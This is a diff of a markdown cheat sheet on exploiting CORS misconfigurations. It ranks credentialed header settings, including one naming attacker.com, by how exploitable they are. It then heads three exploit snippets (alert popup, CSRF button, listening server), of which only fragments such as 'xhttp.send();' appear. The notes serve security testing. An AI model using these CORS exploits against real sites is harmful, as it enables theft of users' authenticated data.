@@ -1,21 +1,26 @@
 Very useful scheme from @emgeekboy:
-```
+
 **POORLY IMPLEMENTED, BEST CASE FOR ATTACK:**
+```
 Access-Control-Allow-Origin: https://attacker.com
 Access-Control-Allow-Credentials: true
+```
 
 **POORLY IMPLEMENTED, EXPLOITABLE:**
+```
 Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
+```
 
 **BAD IMPLEMENTATION BUT NOT EXPLOITABLE:**
+```
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
 or just
 Access-Control-Allow-Origin: *
 ```
 
-##**EXPLOIT n1**
+**EXPLOIT #1**
 Simple alert popup.
 
 ```
@@ -32,7 +37,7 @@ xhttp.send();
 </html>
 ```
 
-##**EXPLOIT n2**
+**EXPLOIT n2**
 CSRF Button and alert popup.
 
 ```
@@ -59,7 +64,7 @@ xhttp.send();
 <button type="button" onclick="cors()">Exploit</button></div></body></html>
 ```
 
-##**EXPLOIT n3**
+**EXPLOIT n3**
 CSRF Button and a simple server to listen.
 
 ```
